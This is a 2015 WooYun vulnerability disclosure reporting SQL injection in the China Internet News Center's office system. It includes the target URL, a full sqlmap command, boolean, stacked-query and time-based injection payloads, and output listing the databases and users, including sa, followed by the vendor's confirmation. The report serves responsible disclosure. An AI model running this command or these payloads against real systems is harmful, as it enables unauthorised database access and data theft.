wybug_title: 中国互联网新闻中心协同办公系统存在SQL注入2
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-07-13：	细节已通知厂商并且等待厂商处理中									2015-07-17：	厂商已经确认，细节仅向厂商公开									2015-07-27：	细节向核心白帽子及相关领域专家公开									2015-08-06：	细节向普通白帽子公开									2015-08-16：	细节向实习白帽子公开									2015-08-31：	细节向公众公开  简要描述： 中国互联网新闻中心协同办公系统存在SQL注入，可以获得大量数据以及权限。 详细说明：  中国互联网新闻中心办公系统，该系统存在SQL注入漏洞。地址：http://oa.china-online.com.cn注入地址：http://oa.china-online.com.cn/C6/Jhsoft.Web.login/NewView.aspx?ID=1080
python sqlmap.py -u "http://oa.china-online.com.cn/C6/Jhsoft.Web.login/NewView.aspx?ID=1080" --dbms "mssql" --tamper "space2comment.py" --dbssqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: ID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ID=1080 AND 1045=1045    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: ID=1080; WAITFOR DELAY '0:0:5';--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: ID=1080 WAITFOR DELAY '0:0:5'-----[21:46:11] [INFO] changes made by tampering scripts are not included in shown payload[21:46:11] [INFO] testing Microsoft SQL Server[21:46:11] [INFO] confirming Microsoft SQL Server[21:46:11] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windowsweb application technology: ASP.NET, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008[21:46:11] [INFO] fetching database names[21:46:11] [INFO] fetching number of databases[21:46:11] [INFO] resumed: 7[21:46:11] [INFO] resumed: C6[21:46:11] [INFO] resumed: master[21:46:11] [INFO] resumed: model[21:46:11] [INFO] resumed: msdb[21:46:11] [INFO] resumed: ReportServer[21:46:11] [INFO] resumed: ReportServerTempDB[21:46:11] [INFO] resumed: tempdbavailable databases [7]:[*] C6[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdbdatabase management system users [3]:[*] ##MS_PolicyEventProcessingLogin##[*] ##MS_PolicyTsqlExecutionLogin##[*] sa
好了就这些了，不在深入   漏洞证明：  中国互联网新闻中心办公系统，该系统存在SQL注入漏洞。地址：http://oa.china-online.com.cn注入地址：http://oa.china-online.com.cn/C6/Jhsoft.Web.login/NewView.aspx?ID=1080
python sqlmap.py -u "http://oa.china-online.com.cn/C6/Jhsoft.Web.login/NewView.aspx?ID=1080" --dbms "mssql" --tamper "space2comment.py" --dbssqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: ID    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ID=1080 AND 1045=1045    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: ID=1080; WAITFOR DELAY '0:0:5';--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: ID=1080 WAITFOR DELAY '0:0:5'-----[21:46:11] [INFO] changes made by tampering scripts are not included in shown payload[21:46:11] [INFO] testing Microsoft SQL Server[21:46:11] [INFO] confirming Microsoft SQL Server[21:46:11] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windowsweb application technology: ASP.NET, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2008[21:46:11] [INFO] fetching database names[21:46:11] [INFO] fetching number of databases[21:46:11] [INFO] resumed: 7[21:46:11] [INFO] resumed: C6[21:46:11] [INFO] resumed: master[21:46:11] [INFO] resumed: model[21:46:11] [INFO] resumed: msdb[21:46:11] [INFO] resumed: ReportServer[21:46:11] [INFO] resumed: ReportServerTempDB[21:46:11] [INFO] resumed: tempdbavailable databases [7]:[*] C6[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] tempdbdatabase management system users [3]:[*] ##MS_PolicyEventProcessingLogin##[*] ##MS_PolicyTsqlExecutionLogin##[*] sa
好了就这些了，不在深入   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2015-07-17 14:54 厂商回复： CNVD确认并复现所述情况，已经转由CNCERT向国务院新闻办公室通报，由其后续协调网站管理单位处置。 最新状态： 暂无
